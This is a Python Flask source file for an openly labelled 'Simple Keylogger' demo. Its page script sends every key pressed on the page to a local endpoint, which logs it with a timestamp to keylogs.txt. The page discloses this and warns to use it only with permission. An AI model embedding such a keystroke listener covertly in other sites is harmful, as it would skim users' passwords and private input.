from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)

LOG_FILE = "keylogs.txt"

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Simple Keylogger</title>
<style>
  body {
    font-family: 'Arial', sans-serif;
    background: linear-gradient(135deg, #6a11cb, #2575fc);
    color: white;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    padding: 1rem;
  }
  h1 {
    font-weight: 700;
    margin-bottom: 0.5em;
    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
  }
  p {
    max-width: 600px;
    margin-bottom: 2em;
    text-align: center;
    font-size: 1.1rem;
    line-height: 1.4;
    background: rgba(0, 0, 0, 0.5);
    padding: 1em;
    border-radius: 10px;
  }
  #status {
    margin-top: 1em;
    font-style: italic;
    font-size: 1.2rem;
    background: rgba(255, 255, 255, 0.1);
    padding: 0.5em;
    border-radius: 5px;
  }
  #keylog-container {
    margin-top: 2em;
    background: rgba(255, 255, 255, 0.1);
    padding: 1em;
    border-radius: 10px;
    max-width: 600px;
    width: 100%;
    overflow-y: auto;
    max-height: 200px;
  }
  .keylog {
    margin: 0.2em 0;
    padding: 0.5em;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 5px;
  }
</style>
</head>
<body>
  <h1>Simple Keylogger</h1>
  <p>
    This webpage captures and sends keystrokes pressed within this page to the Flask server which logs them to a file.<br/>
    <strong>Note:</strong> Use only in controlled, ethical environments with permission.
  </p>
  <p><em>Focus this window and start typing to see the effect.</em></p>
  <div id="status">Status: Ready to record keystrokes...</div>
  <div id="keylog-container"></div>

<script>
let statusEl = document.getElementById('status');
let keylogContainer = document.getElementById('keylog-container');

window.addEventListener('keydown', function(event) {
    let key = event.key;

    // Send the key pressed to the server
    fetch('/log_key', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({key: key}),
    })
    .then(response => {
        if (response.ok) {
            statusEl.textContent = "Status: Logged key: " + key;
            // Add the logged key to the display
            let logEntry = document.createElement('div');
            logEntry.className = 'keylog';
            logEntry.textContent = key;
            keylogContainer.appendChild(logEntry);
        } else {
            statusEl.textContent = "Status: Failed to log key";
        }
    })
    .catch(() => {
        statusEl.textContent = "Status: Error sending key to server";
    });
});
</script>

</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/log_key', methods=['POST'])
def log_key():
    data = request.get_json(force=True)
    key = data.get("key", "")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Basic sanitation: replace newlines in key with literal \n for log file clarity
    key_clean = key.replace("\n", "\\n").replace("\r", "\\r")

    # Append to log file with timestamp
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {key_clean}\n")

    return "", 204

if __name__ == "__main__":
    print("Starting Flask Keylogger on http://127.0.0.1:5000")
    print("Use Ctrl+C to quit")
    app.run(debug=False)
